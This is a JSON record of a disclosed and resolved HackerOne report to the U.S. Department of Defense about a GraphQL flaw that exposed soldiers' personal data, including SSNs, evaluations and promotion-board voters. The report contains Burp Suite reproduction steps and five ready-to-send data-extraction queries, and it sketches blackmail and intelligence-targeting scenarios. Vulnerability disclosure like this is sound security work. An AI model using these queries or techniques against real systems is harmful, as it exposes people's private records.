@@ -1,0 +1,112 @@
+{
+  "id": 2954320,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTU0MzIw",
+  "url": "https://hackerone.com/reports/2954320",
+  "title": "ASBS viewing other soldiers PII/Board/Board Voters/ETC",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-22T20:28:32.755Z",
+  "submitted_at": "2025-01-22T20:28:32.854Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "badlifeguard",
+    "url": "/badlifeguard",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qju6rcv7nf8ioxt2vp5iwi1998oi/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-12T19:19:23.294Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-02-25T12:55:13.183Z",
+  "team_member_agreed_on_going_public_at": "2026-01-12T19:19:23.124Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:**\nAn authenticated user, could run GraphQL queries that return sensitive information on other users. \n\n**Steps to reproduce it**\nPlease see below.\n\n## References\nUsing burp suite, an authenticated user is able to do a full introspection against the target. After the introspection, a user can use Burp Suite Repeater to create custom GraphQL Queries based on information they are trying to find. \nCWE-200, CWE-284, CWE-359\n\n## Impact\n\nThis would allow an attacker to capture data of soldiers by DoDID, to then look up other soldier data to gather board information, SSN, Clearance information, Branch information.  If a user was able to grab their own information, they could make requests to find out who is included with their current board, review evaluations with a DODID, and look up who is voting on the board, or any board for that matter. \n\nAdditionally, this vulnerability partially impacts all components within the DoD.\nArmy Personnel: Active, Reserve, National Guard, Civilians, Contractors\nAir Force: Active, Civilians, Contractors (unvalidated Reserve, National Guard)\nNavy: Reserve (unvalidated Active, National Guard, Civilians, Contractors)\nMarines: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)\nCoast Guard: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)\nSpaceforce: Active (unvalidated Civilians, Contractors)\nDependents: Not impacted unless a valid LDAP entry.\n\nIf a legitimate bad actor wanted to, they could once again, create identities of people with SSNs, background check to find peoples location, but more importantly blackmail and intelligence targeting. \nBlackmail board members would be an idea- \"Promote me or I release blackmail\".\nIntelligence targeting-Foreign adversaries would be interested in this information to build leverage on a soldier to blackmail them to giving up sensitive information.\n\n## System Host(s)\n██████████,████\n\n## Affected Product(s) and Version(s)\n1.09.00.0\n\n## CVE Numbers\n\n\n## Steps to Reproduce\nUsing Burp Suite\nLogin and Authenticate to https://█████████/\n\nOnce logged in, Burp suite > proxy > http history will show you the requests. Looking for host: ███. There will be a POST request to: ███████/████████/graphql. In that request body you can manipulate the request. \n\nWith the use of Outlook address book, a user could get anyones DoDID from the Global Address Book, just by adding a contact to their address book and in the contact information, under certificates, it has their DODID appended to their certificate information (Not the vulnerability).\n\nI have not included any screenshots at this moment, more information can be requested. Let me how how I can assist in this finding.\n\nSome of the requests: Any \"# \" are blocked out for reporting purposes. \nLook up user by DoDID: Only returns Army\n{\"query\":\"query {\\r\\n    userByDodId(dodId: \\\"#########\\\") {\\r\\n        dodId\\r\\n        fullName\\r\\n        indivFirstName\\r\\n        indivLastName\\r\\n        indivMiddleName\\r\\n        personGuid\\r\\n    }\\r\\n}\"}\n\nLook up evaluations by DoDID: Only returns Army\n{\"query\":\"query {\\r\\n    evaluationsByDodId(dodId: \\\"#########\\\") {\\r\\n        aerCrsNm\\r\\n        apftDt \\r\\n        apftRsltCd\\r\\n        bodyFatStdCd\\r\\n        box1\\r\\n        box2\\r\\n        box3\\r\\n        box4\\r\\n        classId\\r\\n        classStandingNr\\r\\n        classStudentQy\\r\\n        cmtTx\\r\\n        docVrsnNr\\r\\n        dodIdNr\\r\\n        dualRtrRoleCd\\r\\n        dutyDescTx\\r\\n        dutyStationNm\\r\\n        evalId\\r\\n        evalPdEndDt \\r\\n        evalPdStDt \\r\\n        evalRecModDtm \\r\\n        evalRptGrpCd\\r\\n        evalRptRsnCd\\r\\n        evalRptRsnCdDesc\\r\\n        evalRptTypCd\\r\\n        evaluationGroupType\\r\\n        gpa\\r\\n        irCmtTx\\r\\n        irDutyTitle\\r\\n        irRankAb\\r\\n        jpmeIndCd\\r\\n        labelPercentage\\r\\n        manualUpload\\r\\n        milEdLvlCd\\r\\n        mosDsgTx\\r\\n        mpcCd\\r\\n        oerRefCd\\r\\n        physMeasHgtIn\\r\\n        physMeasWgtLb\\r\\n        rankAb\\r\\n        ratedFirstNm\\r\\n        ratedFullName\\r\\n        ratedLastNm\\r\\n        ratedMiddleNm\\r\\n        ratedMonths\\r\\n        ratedSuffix\\r\\n        raterDutyTitleTx\\r\\n        raterEvalRatedQy\\r\\n        raterFirstNm\\r\\n        raterFullName\\r\\n        raterLabel\\r\\n        raterLabelDesc\\r\\n        raterLastNm\\r\\n        raterMiddleNm\\r\\n        raterOffRatedQy\\r\\n        raterPerformanceComments\\r\\n        raterPotentialComments\\r\\n        raterRankAb\\r\\n        raterRankRatedQy\\r\\n        raterSuffix\\r\\n        reasonDescTx\\r\\n        rsDutyTitleTx\\r\\n        rsTotalArmyCompCd\\r\\n        seniorRaterDutyTitleTx\\r\\n        seniorRaterEvalRatedQy\\r\\n        seniorRaterFirstNm\\r\\n        seniorRaterFullName\\r\\n        seniorRaterLabel\\r\\n        seniorRaterLabelDesc\\r\\n        seniorRaterLastNm\\r\\n        seniorRaterMiddleNm\\r\\n        seniorRaterOffBasBrCd\\r\\n        seniorRaterOffRatedQy\\r\\n        seniorRaterPotentialComments\\r\\n        seniorRaterRankAb\\r\\n        seniorRaterRankRatedQy\\r\\n        seniorRaterSuffix\\r\\n        sharpStmtCd\\r\\n        srDutyTitleTx\\r\\n        srRankAb\\r\\n        stuIdLocCd\\r\\n        unitDsgTx\\r\\n    }\\r\\n}\"}\n\nLook up candidates per board GUID:\n{\"query\":\"query {\\r\\n    candidatesForBoard(boardGuid: \\\"#######-5881-4E16-9C6C-4BC53014E8CB\\\") {\\r\\n        basdDt \\r\\n        birthDt\\r\\n        boardCandidateGuid\\r\\n        cmsndOffBasicBrCd\\r\\n        cmsndOffBasicBrDesc\\r\\n        cmsndOffControlBrCd\\r\\n        cmsndOffDetailBrCd\\r\\n        dodId\\r\\n        dorDt\\r\\n        enlMosCd\\r\\n        enlPromMosId\\r\\n        indivFirstName\\r\\n        indivLastName\\r\\n        indivMiddleName\\r\\n        indivName\\r\\n        indivSuffixName\\r\\n        ipermsSyncDt\\r\\n        milRankCd\\r\\n        milRankDesc\\r\\n        milSvcCompoCd\\r\\n        milSvcCompoDesc\\r\\n        mpcCd\\r\\n        mpcDesc\\r\\n        orgSrcCd\\r\\n        primaryJobCode\\r\\n        promConsidRecmdCd\\r\\n        promotableStatus\\r\\n        recCreateDt\\r\\n        recCreateSource {\\r\\n            dodId\\r\\n            fullName\\r\\n            indivFirstName\\r\\n            indivLastName\\r\\n            indivMiddleName\\r\\n            personGuid\\r\\n        }\\r\\n        recDeleteInd\\r\\n        recUpdateDt\\r\\n        recUpdateSource {\\r\\n            dodId\\r\\n            fullName\\r\\n            indivFirstName\\r\\n            indivLastName\\r\\n            indivMiddleName\\r\\n            personGuid\\r\\n        }\\r\\n        secondaryJobCode\\r\\n        warrOffMosCd\\r\\n    }\\r\\n}\"}\n\nLook up board voters per board event GUID:\n{\"query\":\"query {\\r\\n    boardEventVoters(boardEventGuid: \\\"#######-5BF0-46C2-8C32-EDD4C89758F8\\\") {\\r\\n        boardEventGuid\\r\\n        boardEventVoterGuid\\r\\n        boardTeamMemberGuid\\r\\n        estTimeToFinish\\r\\n        numCandidatesDistributed\\r\\n        numCandidatesVoted\\r\\n        numInquiries # Long scalar\\r\\n        percentCandidatesVoted\\r\\n        recCreateDt \\r\\n        recCreateSource {\\r\\n            dodId\\r\\n            fullName\\r\\n            indivFirstName\\r\\n            indivLastName\\r\\n            indivMiddleName\\r\\n            personGuid\\r\\n        }\\r\\n        recDeleteInd\\r\\n        recUpdateDt \\r\\n        recUpdateSource {\\r\\n            dodId\\r\\n            fullName\\r\\n            indivFirstName\\r\\n            indivLastName\\r\\n            indivMiddleName\\r\\n            personGuid\\r\\n        }\\r\\n        voter {\\r\\n            dodId\\r\\n            fullName\\r\\n            indivFirstName\\r\\n            indivLastName\\r\\n            indivMiddleName\\r\\n            lastCheckedDt \\r\\n            personGuid\\r\\n            photo\\r\\n        }\\r\\n    }\\r\\n}\"}\n\n\nLook up LDAP person by DoDID: (Reference the impact of DoDIDs from above. Seems like anyone with an active directory account in the DOD)\n{\"query\":\"query {\\r\\n    findLdapPersonByDodId(dodId: \\\"#########\\\") {\\r\\n        accountType\\r\\n        babr\\r\\n        babrDesc\\r\\n        branchOfService\\r\\n        cmfDesc\\r\\n        cn\\r\\n        dymose\\r\\n        ediPi\\r\\n        emailServiceClass\\r\\n        enlistedPmos\\r\\n        fascn\\r\\n        givenName\\r\\n        macom\\r\\n        mail\\r\\n        middleName\\r\\n        occupationCode\\r\\n        officerPaoc\\r\\n        officerPaocDesc\\r\\n        personCategory\\r\\n        personCondType\\r\\n        personNickname\\r\\n        personaDisplayName\\r\\n        personaTitle\\r\\n        personaUid\\r\\n        personaUserName\\r\\n        ptc\\r\\n        rank\\r\\n        sn\\r\\n        ssn\\r\\n        status\\r\\n        uic\\r\\n        uid\\r\\n        userPrincipalName\\r\\n    }\\r\\n}\"}\n\n## Suggested Mitigation/Remediation Actions\nDisable introspection on GraphQL, this will make it harder for an attacker to gain information on how the API works and reduces the risk of unwanted information disclosure.\nReview the API's schema to make sure that it does not expose unintended fields to the public.\nMake sure that suggestions are disabled. This prevents attackers from being able to use Clairvoyance or similar tools to glean information about the underlying schema. If you cannot disable suggestions directly in Apollo. See this https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305 thread for a workaround.\n\nReference links:\nhttps://portswigger.net/web-security/graphql#preventing-graphql-attacks\nhttps://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries\n\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "m4khn0",
+    "mohaned0101",
+    "sisi0x",
+    "khoof",
+    "0xcaphe"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
